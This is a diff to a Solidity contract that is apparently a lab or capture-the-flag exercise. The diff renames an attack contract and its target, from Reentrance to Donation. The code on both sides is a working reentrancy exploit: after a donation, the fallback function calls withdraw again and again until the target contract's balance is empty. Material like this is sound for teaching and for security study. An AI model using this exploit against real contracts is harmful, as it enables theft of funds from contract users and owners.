@@ -1,15 +1,15 @@
 pragma solidity ^0.5.11;
 
-import "./Reentrance.sol";
+import "./Donation.sol";
 
-contract Attack {
+contract Attacker {
 
     address payable public owner;
-    Reentrance public reentrance;
+    Donation public donation;
 
     constructor(address payable _addr) public payable {
         owner = msg.sender;
-        reentrance = Reentrance(_addr);
+        donation = Donation(_addr);
     }
 
     modifier onlyOwner {
@@ -18,13 +18,13 @@ contract Attack {
     }
 
     function donate() external onlyOwner {
-        reentrance.donate.value(0.5 ether)(address(this));
+        donation.donate.value(0.5 ether)(address(this));
     }
 
     function() external payable {
 
-        if (address(reentrance).balance > 0 ) {
-            reentrance.withdraw(0.5 ether);
+        if (address(donation).balance > 0 ) {
+            donation.withdraw(0.5 ether);
         }
     }
 
